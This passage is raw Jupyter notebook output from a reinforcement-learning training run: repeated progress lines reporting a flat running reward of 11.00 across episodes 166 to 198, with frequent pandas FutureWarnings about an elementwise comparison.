      "Running reward: 11.00\t Episode 166\t Frame count: 80500\t Context: 2\n",
      "Running reward: 11.00\t Episode 166\t Frame count: 80600\t Context: 2\n",
      "Running reward: 11.00\t Episode 166\t Frame count: 80700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 166\t Frame count: 80800\t Context: 2\n",
      "Running reward: 11.00\t Episode 166\t Frame count: 80900\t Context: 2\n",
      "Running reward: 11.00\t Episode 166\t Frame count: 81000\t Context: 2\n",
      "Running reward: 11.00\t Episode 167\t Frame count: 81100\t Context: 1\n",
      "Running reward: 11.00\t Episode 167\t Frame count: 81200\t Context: 2\n",
      "Running reward: 11.00\t Episode 167\t Frame count: 81300\t Context: 2\n",
      "Running reward: 11.00\t Episode 168\t Frame count: 81400\t Context: 2\n",
      "Running reward: 11.00\t Episode 169\t Frame count: 81500\t Context: 1\n",
      "Running reward: 11.00\t Episode 170\t Frame count: 81600\t Context: 2\n",
      "Running reward: 11.00\t Episode 170\t Frame count: 81700\t Context: 2\n",
      "Running reward: 11.00\t Episode 170\t Frame count: 81800\t Context: 2\n",
      "Running reward: 11.00\t Episode 171\t Frame count: 81900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 171\t Frame count: 82000\t Context: 2\n",
      "Running reward: 11.00\t Episode 171\t Frame count: 82100\t Context: 2\n",
      "Running reward: 11.00\t Episode 172\t Frame count: 82200\t Context: 1\n",
      "Running reward: 11.00\t Episode 172\t Frame count: 82300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 172\t Frame count: 82400\t Context: 1\n",
      "Running reward: 11.00\t Episode 172\t Frame count: 82500\t Context: 1\n",
      "Running reward: 11.00\t Episode 172\t Frame count: 82600\t Context: 2\n",
      "Running reward: 11.00\t Episode 172\t Frame count: 82700\t Context: 2\n",
      "Running reward: 11.00\t Episode 172\t Frame count: 82800\t Context: 2\n",
      "Running reward: 11.00\t Episode 172\t Frame count: 82900\t Context: 2\n",
      "Running reward: 11.00\t Episode 173\t Frame count: 83000\t Context: 1\n",
      "Running reward: 11.00\t Episode 173\t Frame count: 83100\t Context: 2\n",
      "Running reward: 11.00\t Episode 173\t Frame count: 83200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 174\t Frame count: 83300\t Context: 1\n",
      "Running reward: 11.00\t Episode 174\t Frame count: 83400\t Context: 1\n",
      "Running reward: 11.00\t Episode 174\t Frame count: 83500\t Context: 2\n",
      "Running reward: 11.00\t Episode 174\t Frame count: 83600\t Context: 2\n",
      "Running reward: 11.00\t Episode 174\t Frame count: 83700\t Context: 2\n",
      "Running reward: 11.00\t Episode 174\t Frame count: 83800\t Context: 2\n",
      "Running reward: 11.00\t Episode 174\t Frame count: 83900\t Context: 2\n",
      "Running reward: 11.00\t Episode 174\t Frame count: 84000\t Context: 2\n",
      "Running reward: 11.00\t Episode 174\t Frame count: 84100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 174\t Frame count: 84200\t Context: 2\n",
      "Running reward: 11.00\t Episode 174\t Frame count: 84300\t Context: 2\n",
      "Running reward: 11.00\t Episode 174\t Frame count: 84400\t Context: 2\n",
      "Running reward: 11.00\t Episode 174\t Frame count: 84500\t Context: 2\n",
      "Running reward: 11.00\t Episode 174\t Frame count: 84600\t Context: 2\n",
      "Running reward: 11.00\t Episode 175\t Frame count: 84700\t Context: 2\n",
      "Running reward: 11.00\t Episode 175\t Frame count: 84800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 176\t Frame count: 84900\t Context: 1\n",
      "Running reward: 11.00\t Episode 176\t Frame count: 85000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 176\t Frame count: 85100\t Context: 2\n",
      "Running reward: 11.00\t Episode 176\t Frame count: 85200\t Context: 2\n",
      "Running reward: 11.00\t Episode 176\t Frame count: 85300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 176\t Frame count: 85400\t Context: 2\n",
      "Running reward: 11.00\t Episode 176\t Frame count: 85500\t Context: 2\n",
      "Running reward: 11.00\t Episode 177\t Frame count: 85600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 177\t Frame count: 85700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 177\t Frame count: 85800\t Context: 2\n",
      "Running reward: 11.00\t Episode 178\t Frame count: 85900\t Context: 2\n",
      "Running reward: 11.00\t Episode 178\t Frame count: 86000\t Context: 2\n",
      "Running reward: 11.00\t Episode 178\t Frame count: 86100\t Context: 2\n",
      "Running reward: 11.00\t Episode 178\t Frame count: 86200\t Context: 2\n",
      "Running reward: 11.00\t Episode 178\t Frame count: 86300\t Context: 2\n",
      "Running reward: 11.00\t Episode 178\t Frame count: 86400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 179\t Frame count: 86500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 179\t Frame count: 86600\t Context: 2\n",
      "Running reward: 11.00\t Episode 179\t Frame count: 86700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 180\t Frame count: 86800\t Context: 1\n",
      "Running reward: 11.00\t Episode 180\t Frame count: 86900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 180\t Frame count: 87000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 180\t Frame count: 87100\t Context: 1\n",
      "Running reward: 11.00\t Episode 180\t Frame count: 87200\t Context: 2\n",
      "Running reward: 11.00\t Episode 180\t Frame count: 87300\t Context: 2\n",
      "Running reward: 11.00\t Episode 180\t Frame count: 87400\t Context: 2\n",
      "Running reward: 11.00\t Episode 180\t Frame count: 87500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 180\t Frame count: 87600\t Context: 2\n",
      "Running reward: 11.00\t Episode 180\t Frame count: 87700\t Context: 2\n",
      "Running reward: 11.00\t Episode 180\t Frame count: 87800\t Context: 2\n",
      "Running reward: 11.00\t Episode 180\t Frame count: 87900\t Context: 2\n",
      "Running reward: 11.00\t Episode 180\t Frame count: 88000\t Context: 2\n",
      "Running reward: 11.00\t Episode 180\t Frame count: 88100\t Context: 2\n",
      "Running reward: 11.00\t Episode 180\t Frame count: 88200\t Context: 2\n",
      "Running reward: 11.00\t Episode 181\t Frame count: 88300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 181\t Frame count: 88400\t Context: 2\n",
      "Running reward: 11.00\t Episode 181\t Frame count: 88500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 181\t Frame count: 88600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 181\t Frame count: 88700\t Context: 2\n",
      "Running reward: 11.00\t Episode 182\t Frame count: 88800\t Context: 2\n",
      "Running reward: 11.00\t Episode 182\t Frame count: 88900\t Context: 2\n",
      "Running reward: 11.00\t Episode 182\t Frame count: 89000\t Context: 2\n",
      "Running reward: 11.00\t Episode 183\t Frame count: 89100\t Context: 1\n",
      "Running reward: 11.00\t Episode 183\t Frame count: 89200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 183\t Frame count: 89300\t Context: 1\n",
      "Running reward: 11.00\t Episode 183\t Frame count: 89400\t Context: 1\n",
      "Running reward: 11.00\t Episode 183\t Frame count: 89500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 184\t Frame count: 89600\t Context: 1\n",
      "Running reward: 11.00\t Episode 184\t Frame count: 89700\t Context: 1\n",
      "Running reward: 11.00\t Episode 184\t Frame count: 89800\t Context: 1\n",
      "Running reward: 11.00\t Episode 184\t Frame count: 89900\t Context: 1\n",
      "Running reward: 11.00\t Episode 184\t Frame count: 90000\t Context: 2\n",
      "Running reward: 11.00\t Episode 185\t Frame count: 90100\t Context: 1\n",
      "Running reward: 11.00\t Episode 185\t Frame count: 90200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 185\t Frame count: 90300\t Context: 1\n",
      "Running reward: 11.00\t Episode 185\t Frame count: 90400\t Context: 1\n",
      "Running reward: 11.00\t Episode 185\t Frame count: 90500\t Context: 2\n",
      "Running reward: 11.00\t Episode 185\t Frame count: 90600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 186\t Frame count: 90700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 187\t Frame count: 90800\t Context: 1\n",
      "Running reward: 11.00\t Episode 187\t Frame count: 90900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 187\t Frame count: 91000\t Context: 2\n",
      "Running reward: 11.00\t Episode 188\t Frame count: 91100\t Context: 1\n",
      "Running reward: 11.00\t Episode 188\t Frame count: 91200\t Context: 1\n",
      "Running reward: 11.00\t Episode 188\t Frame count: 91300\t Context: 1\n",
      "Running reward: 11.00\t Episode 188\t Frame count: 91400\t Context: 1\n",
      "Running reward: 11.00\t Episode 188\t Frame count: 91500\t Context: 2\n",
      "Running reward: 11.00\t Episode 188\t Frame count: 91600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 188\t Frame count: 91700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 189\t Frame count: 91800\t Context: 1\n",
      "Running reward: 11.00\t Episode 189\t Frame count: 91900\t Context: 1\n",
      "Running reward: 11.00\t Episode 189\t Frame count: 92000\t Context: 2\n",
      "Running reward: 11.00\t Episode 189\t Frame count: 92100\t Context: 2\n",
      "Running reward: 11.00\t Episode 189\t Frame count: 92200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 189\t Frame count: 92300\t Context: 2\n",
      "Running reward: 11.00\t Episode 190\t Frame count: 92400\t Context: 1\n",
      "Running reward: 11.00\t Episode 190\t Frame count: 92500\t Context: 2\n",
      "Running reward: 11.00\t Episode 190\t Frame count: 92600\t Context: 2\n",
      "Running reward: 11.00\t Episode 190\t Frame count: 92700\t Context: 2\n",
      "Running reward: 11.00\t Episode 192\t Frame count: 92800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 192\t Frame count: 92900\t Context: 1\n",
      "Running reward: 11.00\t Episode 192\t Frame count: 93000\t Context: 1\n",
      "Running reward: 11.00\t Episode 192\t Frame count: 93100\t Context: 1\n",
      "Running reward: 11.00\t Episode 192\t Frame count: 93200\t Context: 1\n",
      "Running reward: 11.00\t Episode 192\t Frame count: 93300\t Context: 2\n",
      "Running reward: 11.00\t Episode 192\t Frame count: 93400\t Context: 2\n",
      "Running reward: 11.00\t Episode 193\t Frame count: 93500\t Context: 1\n",
      "Running reward: 11.00\t Episode 193\t Frame count: 93600\t Context: 1\n",
      "Running reward: 11.00\t Episode 193\t Frame count: 93700\t Context: 1\n",
      "Running reward: 11.00\t Episode 193\t Frame count: 93800\t Context: 1\n",
      "Running reward: 11.00\t Episode 193\t Frame count: 93900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 193\t Frame count: 94000\t Context: 2\n",
      "Running reward: 11.00\t Episode 193\t Frame count: 94100\t Context: 2\n",
      "Running reward: 11.00\t Episode 194\t Frame count: 94200\t Context: 1\n",
      "Running reward: 11.00\t Episode 194\t Frame count: 94300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 194\t Frame count: 94400\t Context: 1\n",
      "Running reward: 11.00\t Episode 194\t Frame count: 94500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 194\t Frame count: 94600\t Context: 1\n",
      "Running reward: 11.00\t Episode 194\t Frame count: 94700\t Context: 1\n",
      "Running reward: 11.00\t Episode 194\t Frame count: 94800\t Context: 2\n",
      "Running reward: 11.00\t Episode 195\t Frame count: 94900\t Context: 1\n",
      "Running reward: 11.00\t Episode 196\t Frame count: 95000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 196\t Frame count: 95100\t Context: 1\n",
      "Running reward: 11.00\t Episode 196\t Frame count: 95200\t Context: 1\n",
      "Running reward: 11.00\t Episode 196\t Frame count: 95300\t Context: 2\n",
      "Running reward: 11.00\t Episode 196\t Frame count: 95400\t Context: 2\n",
      "Running reward: 11.00\t Episode 196\t Frame count: 95500\t Context: 2\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 95600\t Context: 1\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 95700\t Context: 1\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 95800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 197\t Frame count: 95900\t Context: 1\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 96000\t Context: 1\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 96100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 197\t Frame count: 96200\t Context: 1\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 96300\t Context: 1\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 96400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 197\t Frame count: 96500\t Context: 1\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 96600\t Context: 1\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 96700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 197\t Frame count: 96800\t Context: 1\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 96900\t Context: 1\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 97000\t Context: 1\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 97100\t Context: 1\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 97200\t Context: 1\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 97300\t Context: 1\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 97400\t Context: 1\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 97500\t Context: 2\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 97600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 197\t Frame count: 97700\t Context: 2\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 97800\t Context: 2\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 97900\t Context: 2\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 98000\t Context: 2\n",
      "Running reward: 11.00\t Episode 197\t Frame count: 98100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 197\t Frame count: 98200\t Context: 2\n",
      "Running reward: 11.00\t Episode 198\t Frame count: 98300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 198\t Frame count: 98400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
